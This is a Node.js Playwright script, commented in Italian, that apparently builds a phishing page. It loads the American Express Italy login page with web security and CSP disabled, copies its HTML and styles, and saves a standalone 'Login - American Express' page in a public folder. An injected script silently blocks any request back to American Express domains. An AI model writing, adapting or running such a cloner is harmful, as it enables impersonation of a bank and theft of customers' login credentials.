import { chromium } from 'playwright';
import fs from 'fs';

async function cloneAmex() {
  console.log('🚀 Avvio browser...');

  const browser = await chromium.launch({
    headless: false,  // Browser visibile
    args: ['--no-sandbox', '--disable-web-security', '--disable-features=IsolateOrigins,site-per-process']
  });

  const context = await browser.newContext({
    viewport: { width: 1440, height: 900 },
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    locale: 'it-IT',
    bypassCSP: true
  });

  const page = await context.newPage();

  try {
    console.log('📡 Caricamento pagina Amex...');
    await page.goto('https://www.americanexpress.com/it-it/account/login?inav=it_utility_login', {
      waitUntil: 'domcontentloaded',
      timeout: 60000
    });

    console.log('⏳ Attendo rendering...');
    await page.waitForTimeout(10000);

    // Screenshot
    console.log('📸 Screenshot...');
    await page.screenshot({ path: 'public/screenshot.png', fullPage: true });

    // Usa CDP per ottenere l'HTML
    console.log('📝 Ottengo HTML via CDP...');
    const client = await context.newCDPSession(page);
    const { result } = await client.send('Runtime.evaluate', {
      expression: 'document.documentElement.outerHTML',
      returnByValue: true
    });

    const html = result.value;

    // Salva
    fs.writeFileSync('public/raw-captured.html', html);
    console.log('✅ HTML grezzo salvato in public/raw-captured.html');

    // Usa CDP per ottenere solo il body
    const { result: bodyResult } = await client.send('Runtime.evaluate', {
      expression: 'document.body.innerHTML',
      returnByValue: true
    });

    // Estrai styles
    const { result: stylesResult } = await client.send('Runtime.evaluate', {
      expression: `
        Array.from(document.querySelectorAll('style')).map(s => s.outerHTML).join('\\n')
      `,
      returnByValue: true
    });

    const bodyHTML = bodyResult.value;
    const styles = stylesResult.value;

    // Crea HTML pulito
    const cleanHTML = `<!DOCTYPE html>
<html lang="it-IT">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; img-src * data: blob:; font-src * data:;">
<link rel="stylesheet" href="css/dls.min.css">
<title>Login - American Express</title>
${styles}
<style>
body { opacity: 1 !important; visibility: visible !important; }
* { visibility: visible !important; opacity: 1 !important; }
</style>
<script>
(function(){
  const _fetch = window.fetch;
  window.fetch = function(u,o) {
    if(typeof u==='string' && (u.includes('americanexpress')||u.includes('aexp'))) {
      console.log('BLOCKED:',u);
      return Promise.resolve(new Response('{}'));
    }
    return _fetch.apply(this,arguments);
  };
  const _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(m,u) {
    if(typeof u==='string' && (u.includes('americanexpress')||u.includes('aexp'))) return;
    return _open.apply(this,arguments);
  };
})();
</script>
</head>
<body>
${bodyHTML}
</body>
</html>`;

    fs.writeFileSync('public/index.html', cleanHTML);
    console.log('✅ Clone salvato in public/index.html');

  } catch (e) {
    console.error('❌ Errore:', e.message);

    // Prova screenshot comunque
    try {
      await page.screenshot({ path: 'public/error-screenshot.png' });
      console.log('📸 Screenshot errore salvato');
    } catch {}

  } finally {
    await browser.close();
  }
}

cloneAmex();